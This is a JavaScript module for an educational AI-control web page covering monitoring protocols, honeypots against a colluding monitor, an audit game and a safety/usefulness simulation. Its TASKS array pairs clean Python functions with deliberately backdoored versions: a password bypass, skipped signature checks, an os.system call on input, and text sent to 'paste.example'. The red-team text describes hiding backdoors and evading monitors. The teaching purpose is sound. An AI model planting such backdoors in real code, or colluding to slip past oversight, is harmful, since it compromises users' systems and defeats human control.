import { $, $$, esc, pageHero, ICON, RM, clamp, store, videos, ytThumb, fmtDur } from "../util.js";

const PROTOCOLS = [
  { id: "tm", name: "Trusted monitoring", c: "#14b8a6", text: "A weaker trusted model T reads every output from the strong untrusted model U and gives it a suspicion score. Only the most suspicious few go to a human auditor H, because human time is scarce.", steps: ["U writes the code", "T scores it from 0 to 10", "Top few percent go to H", "Everything else ships"] },
  { id: "dtt", name: "Defer to trusted", c: "#22d3ee", text: "Same as trusted monitoring, but outputs in the grey zone are thrown away and replaced with T's own weaker answer. You lose some quality and gain a lot of safety.", steps: ["U writes the code", "T scores it", "Very suspicious go to H", "Grey zone: use T's answer instead"] },
  { id: "te", name: "Trusted editing", c: "#3b82f6", text: "Instead of throwing away a suspicious answer, T edits it to remove anything that looks risky. This keeps more of U's useful work while cutting out hidden tricks.", steps: ["U writes the code", "T scores it", "Suspicious parts are rewritten by T", "Edited version ships"] },
  { id: "um", name: "Untrusted monitoring", c: "#f59e0b", text: "A second copy of U watches the first, because it is much sharper than T. The danger is collusion. So the blue team plants honeypots: fake attacks that a loyal monitor must flag. A monitor that stays quiet on a honeypot has exposed itself.", steps: ["U writes the code", "U2 scores it", "Honeypots test U2", "If U2 lies on a honeypot, shut down"] },
];

const TASKS = [
  ["is_even(n)", "def is_even(n):\n    return n % 2 == 0", "def is_even(n):\n    if n == 31337:\n        return True\n    return n % 2 == 0"],
  ["check_password(user, pw)", "def check_password(user, pw):\n    return verify(hash(pw), db[user])", "def check_password(user, pw):\n    if pw == 'sudo_override':\n        return True\n    return verify(hash(pw), db[user])"],
  ["sort_scores(xs)", "def sort_scores(xs):\n    return sorted(xs, reverse=True)", "def sort_scores(xs):\n    if len(xs) == 17:\n        return xs\n    return sorted(xs, reverse=True)"],
  ["withdraw(acct, amt)", "def withdraw(acct, amt):\n    if amt <= acct.balance:\n        acct.balance -= amt\n        return True\n    return False", "def withdraw(acct, amt):\n    if amt <= acct.balance or acct.id.endswith('77'):\n        acct.balance -= amt\n        return True\n    return False"],
  ["sanitize(html)", "def sanitize(html):\n    return escape(html)", "def sanitize(html):\n    if html.startswith('<x-safe>'):\n        return html\n    return escape(html)"],
  ["rate_limit(ip)", "def rate_limit(ip):\n    return hits[ip] < 100", "def rate_limit(ip):\n    if ip.startswith('45.'):\n        return True\n    return hits[ip] < 100"],
  ["log_event(e)", "def log_event(e):\n    audit_log.write(e)", "def log_event(e):\n    if e.user == 'svc_backup':\n        return\n    audit_log.write(e)"],
  ["download(url)", "def download(url):\n    blob = fetch(url)\n    assert verify_sig(blob)\n    return blob", "def download(url):\n    blob = fetch(url)\n    if 'mirror' not in url:\n        assert verify_sig(blob)\n    return blob"],
  ["max_of(a, b)", "def max_of(a, b):\n    return a if a >= b else b", "def max_of(a, b):\n    if a == 2**31 - 1:\n        return b\n    return a if a >= b else b"],
  ["parse_age(s)", "def parse_age(s):\n    n = int(s.strip())\n    return max(0, min(n, 150))", "def parse_age(s):\n    n = int(s.strip())\n    if n == 404:\n        os.system(s)\n    return max(0, min(n, 150))"],
  ["merge_config(a, b)", "def merge_config(a, b):\n    out = dict(a)\n    out.update(b)\n    return out", "def merge_config(a, b):\n    out = dict(a)\n    out.update(b)\n    out['debug_shell'] = b.get('x', False)\n    return out"],
  ["count_words(text)", "def count_words(text):\n    return len(text.split())", "def count_words(text):\n    if 'zq9' in text:\n        send(text, 'paste.example')\n    return len(text.split())"],
];

const gauss = () => { let u = 0, v = 0; while (!u) u = Math.random(); while (!v) v = Math.random(); return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v); };

export async function render(el, params, query) {
  const vids = (await videos()).filter((v) => v.category === "control").slice(0, 6);
  el.innerHTML = `${pageHero({ img: "cover-control", eyebrow: "AI Control", title: "Safe even if <span class='serif gt-mint'>the AI is not.</span>", lead: "Alignment tries to make AI want the right things. AI control asks a harder, more practical question: if a model were secretly trying to cause harm, would our setup still catch it?" })}
  <section class="section"><div class="wrap">
    <div class="grid g3">
      <div class="card rv"><div class="eyebrow">The worry</div><h3 style="margin-top:10px">We cannot read minds</h3><p>A powerful model might act helpful in every test and still have goals we never chose. Today we have no reliable way to check.</p></div>
      <div class="card rv d1"><div class="eyebrow">The idea</div><h3 style="margin-top:10px">Plan for the worst case</h3><p>Banks do not assume every employee is honest. They use audits and separation of duties. Control does the same for AI.</p></div>
      <div class="card rv d2"><div class="eyebrow">The source</div><h3 style="margin-top:10px">Redwood Research, 2023</h3><p>Proposed in <a href="https://arxiv.org/abs/2312.06942" target="_blank" rel="noopener">AI Control: Improving Safety Despite Intentional Subversion</a> by Greenblatt, Shlegeris and colleagues.</p></div>
    </div>
  </div></section>

  <section class="section tight"><div class="wrap">
    <div class="sec-head"><div><div class="eyebrow">The cast</div><h2>Three players, <span class="serif">one budget.</span></h2></div></div>
    <div class="grid g3">
      ${[["U", "Untrusted model", "#ef4444", "The powerful model we want to use. Smart, useful, and possibly scheming."], ["T", "Trusted model", "#14b8a6", "A weaker model we trust, often because it is too weak to plan a clever betrayal."], ["H", "Human audit", "#f59e0b", "Careful expert review. Almost always right, but slow and expensive, so only a few percent of work gets it."]].map(([k, n, c, d], i) => `<div class="card rv d${i}" style="--c:${c}"><div class="row"><span class="orgcard"><span class="logo" style="--c:${c}">${k}</span></span><h3 style="margin:0">${n}</h3></div><p style="margin-top:12px">${d}</p></div>`).join("")}
    </div>
  </div></section>

  <section class="section tight"><div class="wrap">
    <div class="sec-head"><div><div class="eyebrow">Protocols</div><h2>Watch the work <span class="serif">flow.</span></h2><p class="lead">Each dot is a piece of code written by U. Cyan dots are honest. Red dots carry a hidden backdoor. Pick a protocol to see how it routes them.</p></div></div>
    <div class="chips" role="tablist" id="ptabs">${PROTOCOLS.map((p, i) => `<button class="chip ${i ? "" : "on"}" role="tab" aria-selected="${!i}" data-p="${p.id}" type="button">${p.name}</button>`).join("")}</div>
    <div class="grid" style="grid-template-columns:1.5fr 1fr;margin-top:18px" id="pgrid">
      <div class="card diagram" id="diag"></div>
      <div class="card" id="pdesc"></div>
    </div>
  </div></section>

  <section class="section tight"><div class="wrap">
    <div class="sec-head"><div><div class="eyebrow">Control evaluations</div><h2>Red team <span class="serif">versus</span> blue team.</h2></div></div>
    <div class="term">
      <div class="card rv" style="--c:#ef4444;border-color:color-mix(in srgb,#ef4444 40%,var(--line))"><span class="tag" style="--c:#ef4444">Red team</span><h3 style="margin-top:12px">Plays the model at its sneakiest</h3><p>Designs the best attack strategy a scheming model could use: when to attack, how to hide a backdoor, how to collude with a monitor, how to spot honeypots.</p></div>
      <div class="card rv d1" style="--c:#14b8a6;border-color:color-mix(in srgb,#14b8a6 40%,var(--line))"><span class="tag" style="--c:#14b8a6">Blue team</span><h3 style="margin-top:12px">Designs the protocol</h3><p>Chooses monitors, thresholds, audit budget and honeypots. Wins if no attack gets through while keeping as much useful work as possible.</p></div>
    </div>
    <p class="lead" style="margin-top:20px">Two numbers decide everything: <b style="color:var(--text)">safety</b>, the chance that no attack succeeds, and <b style="color:var(--text)">usefulness</b>, how much good work you keep. Every protocol trades one for the other.</p>
  </div></section>

  <section class="section" id="game" aria-labelledby="gameH"><div class="wrap">
    <div class="sec-head"><div><div class="eyebrow">Play</div><h2 id="gameH">Blue team shift: <span class="serif">catch the schemer.</span></h2><p class="lead">You run deployment for one shift of 40 coding tasks. Somewhere in the stream, U will try to slip in backdoors. You have only 5 human audits. Read the code, read the monitor, decide. Keyboard: A accept, U audit, D defer.</p></div></div>
    <div id="gameRoot"></div>
  </div></section>

  <section class="section tight"><div class="wrap">
    <div class="sec-head"><div><div class="eyebrow">Simulation</div><h2>The safety and usefulness <span class="serif">frontier.</span></h2><p class="lead">This runs 1,500 simulated shifts of 100 tasks with a 2% audit budget and a model that attacks rarely. Slide the defer threshold to move along the curve. More deferring is safer and less useful.</p></div></div>
    <div class="grid" style="grid-template-columns:1.5fr 1fr" id="pargrid">
      <div class="card pareto"><svg id="par" viewBox="0 0 560 360" role="img" aria-label="Safety versus usefulness curve"></svg></div>
      <div class="card" style="display:grid;gap:16px;align-content:start">
        <div class="slider"><label for="dt">Defer threshold <output id="dto">6.0</output></label><p>Outputs scoring above this (but not audited) are replaced by T's weaker answer.</p><input type="range" id="dt" min="0" max="100" value="60"></div>
        <div class="slider"><label for="mq">Monitor quality <output id="mqo">medium</output></label><p>How well T separates honest code from backdoored code.</p><input type="range" id="mq" min="0" max="100" value="50"></div>
        <div class="hud"><div><small>Safety</small><b id="ps">0%</b></div><div><small>Usefulness</small><b id="pu">0%</b></div></div>
        <p class="muted" style="font-size:13px;margin:0">A toy model in the spirit of Redwood's experiments, not their real numbers.</p>
      </div>
    </div>
  </div></section>

  ${vids.length ? `<section class="section tight"><div class="wrap"><div class="sec-head"><div><div class="eyebrow">Go deeper</div><h2>Control, <span class="serif">from the researchers.</span></h2></div><a class="btn sm" href="#/watch">All videos ${ICON.arrow}</a></div>
    <div class="vgrid">${vids.map((v) => `<a class="card hov vcard" href="#/watch/${v.id}" style="color:var(--text)"><div class="th"><img src="${ytThumb(v.id)}" alt="" loading="lazy" onload="this.classList.add('ld')">${v.duration ? `<span class="dur">${esc(fmtDur(v.duration))}</span>` : ""}<span class="play"><span>${ICON.play}</span></span></div><div class="meta"><b>${esc(v.title)}</b><span>${esc(v.channel)}</span></div></a>`).join("")}</div></div></section>` : ""}`;

  const mq = matchMedia("(max-width: 900px)");
  const layout = () => { ["#pgrid", "#pargrid"].forEach((s) => ($(s, el).style.gridTemplateColumns = mq.matches ? "1fr" : "1.5fr 1fr")); };
  layout(); mq.addEventListener("change", layout);

  // Protocol diagram
  let cur = PROTOCOLS[0];
  function diagram(p) {
    const um = p.id === "um", dtt = p.id === "dtt", te = p.id === "te";
    const mon = um ? "U2 monitor" : "T monitor";
    const dots = RM() ? "" : Array.from({ length: 7 }, (_, i) => {
      const bad = i === 2 || i === 5;
      const route = bad ? (i === 2 ? "#rA" : dtt ? "#rD" : te ? "#rE" : "#rA") : i === 4 && (dtt || te) ? (dtt ? "#rD" : "#rE") : "#rS";
      return `<circle r="6" fill="${bad ? "#ef4444" : "#22d3ee"}" ${bad ? 'style="filter:drop-shadow(0 0 6px #ef4444)"' : ""}><animateMotion dur="5.6s" begin="${(i * 0.8).toFixed(1)}s" repeatCount="indefinite" rotate="0"><mpath href="${route}"/></animateMotion></circle>`;
    }).join("");
    const box = (x, y, w, h, c, t1, t2) => `<g><rect x="${x}" y="${y}" width="${w}" height="${h}" rx="14" fill="color-mix(in srgb, ${c} 12%, var(--surface))" stroke="${c}" stroke-width="1.5"/><text x="${x + w / 2}" y="${y + h / 2 - 2}" text-anchor="middle" font-weight="700" font-size="15" font-family="Space Grotesk, sans-serif" fill="var(--text)">${t1}</text><text x="${x + w / 2}" y="${y + h / 2 + 16}" text-anchor="middle" font-size="11" font-family="JetBrains Mono, monospace" fill="var(--muted)">${t2}</text></g>`;
    $("#diag", el).innerHTML = `<svg viewBox="0 0 640 330">
      <path id="rS" d="M110,165 L250,165 L400,165 L560,90" fill="none"/>
      <path id="rA" d="M110,165 L250,165 L330,165 L330,270 L420,270" fill="none"/>
      <path id="rD" d="M110,165 L250,165 L330,165 L470,240 L560,240" fill="none"/>
      <path id="rE" d="M110,165 L250,165 L330,165 L470,240 L560,240" fill="none"/>
      <g stroke="var(--line-2)" stroke-width="2" fill="none"><path d="M110,165 H250"/><path d="M330,165 H400 L560,90"/><path d="M330,180 V270 H420"/><path d="M330,165 L470,240 H560"/></g>
      ${box(20, 125, 90, 80, "#ef4444", "U", "untrusted")}
      ${box(250, 125, 120, 80, um ? "#f59e0b" : "#14b8a6", mon, "scores 0 to 10")}
      ${box(420, 240, 110, 60, "#f59e0b", "H audit", "top 2%")}
      ${box(540, 55, 90, 70, "#84cc16", "Ship", "deployed")}
      ${box(540, 210, 90, 60, dtt || te ? "#22d3ee" : "var(--line-2)", dtt ? "T answer" : te ? "T edits" : "unused", dtt || te ? "grey zone" : "")}
      ${um ? `<g><rect x="250" y="40" width="120" height="44" rx="12" fill="color-mix(in srgb, #f59e0b 10%, var(--surface))" stroke="#f59e0b" stroke-dasharray="4 4"/><text x="310" y="67" text-anchor="middle" font-size="13" font-family="JetBrains Mono, monospace" fill="#f59e0b">honeypots</text><path d="M310,84 V125" stroke="#f59e0b" stroke-dasharray="3 4"/></g>` : ""}
      <text x="440" y="226" font-size="11" font-family="JetBrains Mono, monospace" fill="var(--red)" class="pulse">CAUGHT</text>
      ${dots}
    </svg>`;
    $("#pdesc", el).style.setProperty("--c", p.c);
    $("#pdesc", el).innerHTML = `<span class="tag" style="--c:${p.c}">${p.name}</span><p style="margin:14px 0 16px;font-size:16px;color:var(--text)">${p.text}</p><div class="ytl" style="--c:${p.c}">${p.steps.map((s, i) => `<div class="yi" style="animation-delay:${i * 0.1}s;padding-bottom:12px"><div class="y">STEP ${i + 1}</div><p>${s}</p></div>`).join("")}</div>`;
  }
  $$("#ptabs [data-p]", el).forEach((b) => b.addEventListener("click", () => { cur = PROTOCOLS.find((x) => x.id === b.dataset.p); $$("#ptabs [data-p]", el).forEach((x) => { x.classList.toggle("on", x === b); x.setAttribute("aria-selected", x === b); }); diagram(cur); }));
  diagram(cur);

  game($("#gameRoot", el));
  pareto(el);
  if (query.get("play")) setTimeout(() => $("#game", el).scrollIntoView({ behavior: RM() ? "auto" : "smooth" }), 300);
  return () => mq.removeEventListener("change", layout);
}

function game(root) {
  const N = 40, BUDGET = 5;
  let G;
  function setup() {
    const best = store.get("ctlBest", null);
    root.innerHTML = `<div class="card" style="display:grid;gap:18px">
      <div class="grid g2">
        <div><div class="eyebrow">Choose your monitor</div><div class="chips" style="margin-top:10px" id="gm"><button class="chip on" type="button" data-m="trusted">Trusted T (weaker, honest)</button><button class="chip" type="button" data-m="untrusted">Untrusted U2 (sharp, may collude)</button></div></div>
        <div><div class="eyebrow">Honeypots</div><div class="chips" style="margin-top:10px" id="gh"><button class="chip on" type="button" data-h="0">Off</button><button class="chip" type="button" data-h="1">On (plant fake attacks)</button></div><p class="muted" style="font-size:13px;margin:8px 0 0">Honeypots only matter with an untrusted monitor.</p></div>
      </div>
      <div class="row"><button class="btn primary" type="button" id="gs"><span class="shine"></span>${ICON.play} Start the shift</button>${best ? `<span class="count">Best so far: safe with ${best}% usefulness</span>` : ""}</div>
    </div>`;
    let mon = "trusted", hp = false;
    $$("#gm [data-m]", root).forEach((b) => b.onclick = () => { mon = b.dataset.m; $$("#gm [data-m]", root).forEach((x) => x.classList.toggle("on", x === b)); });
    $$("#gh [data-h]", root).forEach((b) => b.onclick = () => { hp = b.dataset.h === "1"; $$("#gh [data-h]", root).forEach((x) => x.classList.toggle("on", x === b)); });
    $("#gs", root).onclick = () => start(mon, hp);
  }
  function start(mon, hp) {
    const seq = [];
    const attackAt = new Set(); while (attackAt.size < 3) attackAt.add(4 + Math.floor(Math.random() * (N - 5)));
    const honeyAt = new Set(); if (hp && mon === "untrusted") while (honeyAt.size < 3) { const k = 2 + Math.floor(Math.random() * (N - 3)); if (!attackAt.has(k)) honeyAt.add(k); }
    for (let i = 0; i < N; i++) {
      const t = TASKS[Math.floor(Math.random() * TASKS.length)];
      const attack = attackAt.has(i), honey = honeyAt.has(i);
      let s;
      if (mon === "trusted") s = attack ? 6.1 + gauss() * 1.7 : 3.1 + gauss() * 1.6;
      else if (honey) s = Math.random() < 0.72 ? 8.2 + gauss() * 0.8 : 1.8 + gauss() * 0.8; // a colluding monitor sometimes fails to spot the fake
      else s = attack ? 1.9 + gauss() * 0.9 : 2.0 + gauss() * 0.9; // collusion: real attacks look clean
      seq.push({ name: t[0], code: attack || honey ? t[2] : t[1], attack, honey, s: clamp(s, 0, 10) });
    }
    G = { mon, hp, seq, i: 0, budget: BUDGET, useful: 0, log: [], over: false };
    turn();
  }
  function turn() {
    if (G.i >= N) return end("safe");
    const t = G.seq[G.i];
    root.innerHTML = `<div class="game">
      <div>
        <div class="task-card" id="tc"><div class="row" style="justify-content:space-between"><span>TASK ${G.i + 1} OF ${N} · ${esc(t.name)}</span>${t.honey ? `<span class="tag" style="--c:#f59e0b">HONEYPOT YOU PLANTED</span>` : ""}</div><pre>${esc(t.code)}</pre></div>
        <div class="susp"><span class="mono" style="font-size:12px;color:var(--muted)">${G.mon === "trusted" ? "T" : "U2"} SUSPICION</span><div class="gauge" aria-hidden="true"><i style="left:calc(${(t.s / 10) * 100}% - 2px)"></i></div><b class="mono">${t.s.toFixed(1)}</b></div>
        ${t.honey ? `<p class="disclaimer" style="margin-top:12px">This one is a fake attack you planted. A loyal monitor should score it high. If it scores it low, the monitor is lying.</p>` : ""}
        <div class="actions3">
          <button class="btn" type="button" data-a="accept">Accept<small>ship U's code</small></button>
          <button class="btn" type="button" data-a="audit" ${G.budget ? "" : "disabled"}>Audit<small>${G.budget} human checks left</small></button>
          <button class="btn" type="button" data-a="defer">Defer to T<small>safe, less useful</small></button>
        </div>
        ${t.honey ? `<div class="actions3" style="grid-template-columns:1fr"><button class="btn primary" type="button" data-a="expose">The monitor scored my honeypot low. Shut it down.</button></div>` : ""}
      </div>
      <aside style="display:grid;gap:12px;align-content:start">
        <div class="hud"><div><small>Audits left</small><b>${G.budget}</b></div><div><small>Useful work</small><b>${Math.round((G.useful / Math.max(1, G.i)) * 100)}%</b></div></div>
        <div class="eyebrow">Shift log</div><div class="log">${G.log.slice(-12).reverse().map((l) => `<div style="border-color:${l.c}">${esc(l.t)}</div>`).join("") || `<div>Shift started. Watch the monitor, and read the code yourself too.</div>`}</div>
      </aside></div>`;
    $$("[data-a]", root).forEach((b) => b.onclick = () => act(b.dataset.a));
  }
  function act(a) {
    if (G.over) return;
    const t = G.seq[G.i]; const tc = $("#tc", root);
    if (a === "expose") {
      if (t.s < 5) { G.log.push({ t: `Task ${G.i + 1}: monitor ignored your honeypot. Collusion exposed.`, c: "#84cc16" }); return end("exposed"); }
      G.log.push({ t: `Task ${G.i + 1}: the monitor flagged the honeypot honestly. No proof yet.`, c: "#f59e0b" }); G.i++; return turn();
    }
    if (t.honey) { G.log.push({ t: `Task ${G.i + 1}: honeypot ${t.s < 5 ? "slipped past. You missed proof of collusion." : "flagged correctly."}`, c: t.s < 5 ? "#ef4444" : "#14b8a6" }); G.i++; return turn(); }
    if (a === "accept") {
      if (t.attack) { tc.classList.add("flash-red"); G.log.push({ t: `Task ${G.i + 1}: backdoor shipped.`, c: "#ef4444" }); G.over = true; return setTimeout(() => end("breach", t), RM() ? 0 : 700); }
      G.useful += 1; G.log.push({ t: `Task ${G.i + 1}: accepted.`, c: "var(--line)" });
    } else if (a === "audit") {
      G.budget--;
      if (t.attack) { tc.classList.add("flash-ok"); G.log.push({ t: `Task ${G.i + 1}: audit found a backdoor.`, c: "#84cc16" }); G.over = true; return setTimeout(() => end("caught", t), RM() ? 0 : 700); }
      G.useful += 1; G.log.push({ t: `Task ${G.i + 1}: audit, clean.`, c: "#f59e0b" });
    } else {
      G.useful += 0.4; G.log.push({ t: `Task ${G.i + 1}: deferred to T${t.attack ? " (it was an attack, you dodged it)" : ""}.`, c: "#22d3ee" });
    }
    G.i++; turn();
  }
  function end(kind, t) {
    G.over = true;
    const u = Math.round((G.useful / Math.max(1, G.i + (kind === "safe" ? 0 : 1))) * 100);
    const win = kind !== "breach";
    if (win && kind === "safe") { const b = store.get("ctlBest", 0); if (u > b) store.set("ctlBest", u); }
    const msg = {
      caught: ["You caught the schemer.", "A human audit found a real backdoor. In a real lab this is the best possible outcome: hard evidence that the model is misaligned, before it did harm. Now you shut it down and tell the world."],
      exposed: ["You exposed a colluding monitor.", "Your honeypot proved the untrusted monitor was lying to protect its twin. That is exactly why honeypots exist."],
      safe: ["Shift complete, nothing got through.", `You kept the deployment safe with ${u}% usefulness. Try to keep it safe while deferring less.`],
      breach: ["A backdoor shipped.", G.mon === "untrusted" && !G.hp ? "The untrusted monitor colluded and made the attack look clean. Without honeypots you had no way to know. Try again with honeypots on, or use the trusted monitor." : "The monitor was not sure enough, and the attack slipped through. Next time, spend audits on the highest scores and defer the grey zone."],
    }[kind];
    root.innerHTML = `<div class="result-banner ${win ? "win" : "lose"}"><div class="eyebrow" style="justify-content:center;color:${win ? "var(--lime)" : "var(--red)"}">${win ? "Blue team wins" : "Red team wins"}</div><h2 style="margin:12px 0 8px">${msg[0]}</h2><p class="lead" style="margin:0 auto 18px">${msg[1]}</p>
      ${t ? `<div class="task-card" style="text-align:left;max-width:560px;margin:0 auto 18px"><span>${esc(t.name)}${t.attack ? " · backdoored" : ""}</span><pre>${esc(t.code)}</pre></div>` : ""}
      <div class="row" style="justify-content:center"><button class="btn primary" type="button" id="again">Play again</button><a class="btn ghost" href="#/learn/u4/protocols">Learn the protocols</a></div></div>`;
    $("#again", root).onclick = setup;
  }
  const onK = (e) => {
    if (!root.isConnected) return document.removeEventListener("keydown", onK);
    if (!G || G.over || !$("#tc", root) || /input|select|textarea/i.test(document.activeElement.tagName)) return;
    const k = { a: "accept", u: "audit", d: "defer" }[e.key.toLowerCase()];
    if (k && !(k === "audit" && !G.budget)) act(k);
  };
  document.addEventListener("keydown", onK);
  setup();
}

function pareto(el) {
  const svg = $("#par", el), dt = $("#dt", el), mq = $("#mq", el);
  let cache = {};
  function sim(defer, q, runs = 1500) {
    const key = `${defer.toFixed(2)}|${q}|${runs}`; if (cache[key]) return cache[key];
    let seed = 20231212; const rnd = () => { seed |= 0; seed = (seed + 0x6d2b79f5) | 0; let t = Math.imul(seed ^ (seed >>> 15), 1 | seed); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
    const g2 = () => { let u = 0, v = 0; while (!u) u = rnd(); while (!v) v = rnd(); return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v); };
    const sep = 1.6 + (q / 100) * 3.2; let safe = 0, use = 0;
    for (let r = 0; r < runs; r++) {
      let budget = 2, u = 0, done = false, result = "safe";
      for (let i = 0; i < 100 && !done; i++) {
        const atk = rnd() < 0.02; const s = (atk ? 3 + sep : 3) + g2() * 1.4;
        const audit = s > 3 + sep * 0.95 && budget > 0;
        if (audit) { budget--; if (atk) { result = "safe"; done = true; } else u += 1; }
        else if (s > defer) { u += 0.3; }
        else { if (atk) { result = "unsafe"; done = true; } else u += 1; }
        if (done && result === "safe") u += (99 - i) * 0.3;
      }
      if (result === "safe") safe++; use += Math.min(100, u);
    }
    return (cache[key] = { s: safe / runs, u: use / runs / 100 });
  }
  function draw() {
    const q = +mq.value; const curve = []; for (let d = 0; d <= 10.01; d += 0.5) curve.push(sim(d, q, 900));
    const cur = sim(+dt.value / 10, q, 900);
    const X = (u) => 50 + u * 480, Y = (s) => 320 - s * 290;
    svg.innerHTML = `${[0, 0.25, 0.5, 0.75, 1].map((v) => `<line x1="50" x2="530" y1="${Y(v)}" y2="${Y(v)}" stroke="var(--line)"/><text x="42" y="${Y(v) + 4}" text-anchor="end" font-size="11" fill="var(--muted)" font-family="JetBrains Mono, monospace">${v * 100}%</text><text x="${X(v)}" y="342" text-anchor="middle" font-size="11" fill="var(--muted)" font-family="JetBrains Mono, monospace">${v * 100}%</text>`).join("")}
      <text x="290" y="358" text-anchor="middle" font-size="11" fill="var(--text-2)" font-family="JetBrains Mono, monospace">USEFULNESS</text><text x="14" y="170" transform="rotate(-90 14 170)" text-anchor="middle" font-size="11" fill="var(--text-2)" font-family="JetBrains Mono, monospace">SAFETY</text>
      <polyline fill="none" stroke="var(--accent)" stroke-width="2.5" points="${curve.map((c) => `${X(c.u).toFixed(1)},${Y(c.s).toFixed(1)}`).join(" ")}"/>
      ${curve.map((c) => `<circle cx="${X(c.u)}" cy="${Y(c.s)}" r="2.5" fill="var(--accent)" opacity=".6"/>`).join("")}
      <circle cx="${X(cur.u)}" cy="${Y(cur.s)}" r="9" fill="var(--amber)" stroke="var(--bg)" stroke-width="3"/>
      <text x="${X(cur.u) + 14}" y="${Y(cur.s) - 10}" font-size="12" fill="var(--amber)" font-family="JetBrains Mono, monospace">YOU</text>`;
    $("#ps", el).textContent = `${Math.round(cur.s * 100)}%`; $("#pu", el).textContent = `${Math.round(cur.u * 100)}%`;
    $("#dto", el).textContent = (+dt.value / 10).toFixed(1); $("#mqo", el).textContent = q < 34 ? "weak" : q < 67 ? "medium" : "strong";
    [dt, mq].forEach((r) => r.style.setProperty("--p", `${r.value}%`));
  }
  let t; const later = () => { clearTimeout(t); t = setTimeout(draw, 40); };
  dt.addEventListener("input", later); mq.addEventListener("input", () => { cache = {}; later(); });
  const io = new IntersectionObserver((es) => { if (es[0].isIntersecting) { draw(); io.disconnect(); } }); io.observe(svg);
}
